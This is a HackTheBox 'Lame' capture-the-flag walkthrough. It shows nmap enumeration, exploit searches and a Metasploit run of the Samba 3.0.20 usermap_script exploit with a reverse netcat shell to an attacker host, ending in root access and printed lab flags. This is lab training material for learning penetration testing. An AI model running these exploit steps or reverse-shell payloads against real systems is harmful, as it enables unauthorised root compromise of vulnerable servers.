---
title: HackTheBox - Lame Walkthrough
publishDate: 2023-05-28
author: Abhinav Kumar
image:   '~/assets/images/HTB_Lame.png'
excerpt: HackTheBox Lame machine is a Linux machine , easy for starters.
draft: false
category: HackTheBox
---

# Lame

HackTheBox Link to Lame Machine - [HTB Lame](https://app.hackthebox.com/machines/lame)


Initial Nmap Scan for the machine/endpoint

The default scan gives no results , using -Pn switch gives FTP, SSH, NetBIOS, and SMB ports, scanning for all ports adds one more open port - 3632 . So we scan all these ports for Service versions.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap lame.htb              
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
                                                                                                                                                                                                                                              
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap -Pn -p- -T5 lame.htb  
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.050s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 72.35 seconds
                                                                                                                                                                                                                                              
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap -sC -sV -Pn -p 21,22,139,445,3632 -T5 lame.ht
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.049s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-05-27T18:44:56-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m42s, deviation: 2h49m43s, median: 41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.88 seconds
```


Searching Exploits 
vsftpd anonymous Login to FTP did not give any results, hence looking at SMB.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ searchsploit vsftpd 2.3.4
----------- ---------------------------------
 Exploit Title |  Path
----------- ---------------------------------
vsftpd 2.3 | unix/remote/17491.rb
vsftpd 2.3 | unix/remote/49757.py
----------- ---------------------------------
Shellcodes: No Results
                                             
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ searchsploit samba 3.0.20 
----------- ---------------------------------
 Exploit Title |  Path
----------- ---------------------------------
Samba 3.0. | multiple/remote/10095.txt
Samba 3.0. | unix/remote/16320.rb
Samba < 3. | linux/remote/7701.txt
Samba < 3. | linux_x86/dos/36741.py
----------- ---------------------------------
Shellcodes: No Results


```

Searching Exploits in Metasploit and setting the options .

```bash
                                                                                           
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ sudo msfdb start                                
[sudo] password for abhinav: 
[+] Starting database
                                                                                            
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ msfconsole 
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v6.3.16-dev                          ]
+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]
+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0
Metasploit Documentation: https://docs.metasploit.com/

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:p
                                       ort][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com
                                       /docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.211.55.11     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set rhost lame.htb
rhost => lame.htb
msf6 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.14.10
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:45549) at 2023-05-28 22:32:45 +0530


```

Checking the user on Shell session we notice we are now root, so we can read through all the flags , user flag present in makis user directory and root at usual location

```bash

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:45549) at 2023-05-28 22:32:45 +0530

whoami
root
pwd
/


cd home
ls
ftp
makis
service
user
cd user
ls
cd ..
cd makis
ls
user.txt
cat user.txt
030cbd25cfc0f796f630983ded15fc38
cat /root/root.txt
db586d142eae0e9f16ff5a4deb4bb0c2


```

